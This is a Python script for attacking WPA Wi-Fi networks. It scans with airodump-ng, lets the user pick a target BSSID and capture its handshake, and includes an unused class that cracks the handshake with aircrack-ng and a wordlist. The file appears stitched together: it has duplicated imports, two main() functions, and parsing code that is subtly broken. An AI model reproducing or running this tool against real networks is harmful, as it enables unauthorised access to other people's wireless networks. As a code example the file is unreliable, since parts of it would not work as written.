import subprocess
import getmac


class WordlistAttackTool:
    def __init__(self, handshake_file, wordlist_file):
        self.handshake_file = handshake_file
        self.wordlist_file = wordlist_file

    def run_wordlist_attack(self):
        """Perform wordlist attack using aircrack-ng"""
        print("Performing wordlist attack...")

        # Start wordlist attack using aircrack-ng
        cmd = ["aircrack-ng", self.handshake_file, '-w', self.wordlist_file]
        subprocess.call(cmd)

        print("Wordlist attack completed.")


import subprocess
import getmac


class WifiScan:
    def __init__(self, adapter):
        self.adapter = adapter

    def capture_handshake(self):
        """Capture WPA handshake"""
        print("Capturing handshake")

        # Get the current MAC address
        current_mac = getmac.get_mac_address(interface=self.adapter)
        print("Current MAC address:", current_mac)

        try:
            output = subprocess.check_output(['airodump-ng', '--output-format', 'csv', self.adapter])
            bssids = []
            lines = output.splitlines()
            for line in lines:
                if line.strip().startswith('BSSID'):
                    bssid, channel, _ = line.split(',', 3)[0:3]
                    bssids.append((bssid, channel))
            print("Available BSSIDs:")
            for i, (bssid, channel) in enumerate(bssids, start=1):
                print(f"{i}. BSSID: {bssid}, Channel: {channel}")
            bssid_choice = int(input("Select the client BSSID: "))
            selected_bssid = bssids[bssid_choice - 1]
            channel = selected_bssid[1]
            client_bssid = selected_bssid[0]
            handshake_file = input("[+] Input handshake file name: ")
            self.run_airodump(client_bssid, channel, handshake_file)
        except subprocess.CalledProcessError as e:
            print("Error: Failed to retrieve BSSIDs:", e)

    def run_airodump(self, client_bssid, channel, handshake_file):
        """Run airodump-ng with selected BSSID and channel"""
        subprocess.run([
            'airodump-ng',
            '--bssid', client_bssid,
            '--channel', channel,
            '--write', handshake_file,
            self.adapter
        ])

    def run_wifi_scan(self):
        while True:
            try:
                self.capture_handshake()
            except KeyboardInterrupt:
                break


def main():
    adapter = input("[+] Input Wi-Fi adapter: ")
    tool = WifiScan(adapter)
    tool.run_wifi_scan()

    # Execute the desired function after the scan
    print("Scanning complete. Running the next function...")
    # Run the next function here


if __name__ == "__main__":
    main()


def main():
    adapter = input("[+] Input Wi-Fi adapter: ")
    tool = WifiScan(adapter)
    tool.run_wifi_scan()


if __name__ == "__main__":
    main()
